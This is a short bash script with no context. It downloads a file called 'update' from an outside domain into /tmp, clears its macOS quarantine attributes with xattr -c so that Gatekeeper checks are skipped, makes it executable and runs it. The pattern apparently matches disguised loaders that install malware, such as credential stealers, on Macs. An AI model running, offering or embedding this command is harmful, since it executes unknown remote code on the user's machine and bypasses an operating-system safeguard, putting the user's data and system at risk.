#!/bin/bash
curl -o /tmp/update https://mdeih.com/get7/update && xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
